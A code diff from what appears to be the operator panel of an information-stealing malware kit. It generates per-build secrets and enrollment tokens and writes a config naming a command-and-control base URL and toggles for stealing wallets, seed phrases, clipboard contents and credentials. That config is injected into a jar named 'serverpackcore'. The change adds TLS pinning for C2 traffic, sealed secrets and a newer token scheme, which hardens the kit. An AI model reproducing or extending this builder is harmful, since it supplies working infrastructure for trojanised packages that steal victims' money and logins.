@@ -3,15 +3,19 @@ import { mkdir, readFile, writeFile } from 'node:fs/promises';
 import { dirname, join } from 'node:path';
 import { prisma } from '../lib/db';
 import { env } from '../lib/env';
-import { b64u, buildToken, buildTokenHash, sealSecret } from '../lib/crypto';
+import { b64u, enrollTokenV2, enrollTokenHashV2, sealSecret } from '../lib/crypto';
 
 export type BuildConfig = {
   schema: 1;
   build_id: string;
   build_secret: string;
+  artifact_scheme: 1 | 2;
   c2_base: string;
   panel_url: string;
   resolver_url: string;
+  /// Base64 SPKI SHA-256, current + next. Empty keeps the system trust store.
+  tls_pins: string[];
+  enroll_grace_hours: number;
   profile: 'lite' | 'full';
   modules: { wallets: boolean; clipboard: boolean; credentials: boolean; seeds: boolean };
   bandwidth_kbps: number;
@@ -30,6 +34,7 @@ export async function createBuild(input: {
   c2Base?: string;
   modules?: { wallets: boolean; clipboard: boolean; credentials: boolean; seeds: boolean };
   crack?: boolean;
+  enrollGraceHours?: number;
 }): Promise<{ id: string; buildId: string; token: string; config: BuildConfig }> {
   const secret = b64u(randomBytes(32));
   const buildId = randomUUID();
@@ -37,9 +42,12 @@ export async function createBuild(input: {
     schema: 1,
     build_id: buildId,
     build_secret: secret,
+    artifact_scheme: 2,
     c2_base: input.c2Base ?? `${env.PUBLIC_URL}/api/v1`,
     panel_url: env.PUBLIC_URL,
     resolver_url: '',
+    tls_pins: [],
+    enroll_grace_hours: input.enrollGraceHours ?? 24,
     profile: input.profile,
     modules: {
       wallets: input.modules?.wallets ?? true,
@@ -60,13 +68,15 @@ export async function createBuild(input: {
       version: input.version,
       profile: input.profile,
       buildId,
-      tokenHash: buildTokenHash(secret),
-      secret,
+      tokenHash: enrollTokenHashV2(secret, buildId),
+      secret: sealSecret(secret),
+      enrollScheme: 2,
+      enrollGraceHours: input.enrollGraceHours ?? 24,
       config: config as never,
       createdById: input.operatorId
     }
   });
-  return { id: build.id, buildId, token: buildToken(secret), config };
+  return { id: build.id, buildId, token: enrollTokenV2(secret, buildId), config };
 }
 
 /** Writes config.json into a copy of the jar (STORED entry), returns the jar path. */
@@ -92,9 +102,12 @@ async function injectWithJszip(
 
 async function injectWithJava(jarPath: string, config: BuildConfig, target: string): Promise<string> {
   const { execFile } = await import('node:child_process');
+  const { copyFile } = await import('node:fs/promises');
   const { promisify } = await import('node:util');
-  await promisify(execFile)('jar', ['uf', jarPath, '-C', await writeConfig(config), 'serverpackcore/config.json']);
-  return jarPath;
+  await mkdir(dirname(target), { recursive: true });
+  await copyFile(jarPath, target);
+  await promisify(execFile)('jar', ['uf', target, '-C', await writeConfig(config), 'serverpackcore/config.json']);
+  return target;
 }
 
 async function writeConfig(config: BuildConfig): Promise<string> {
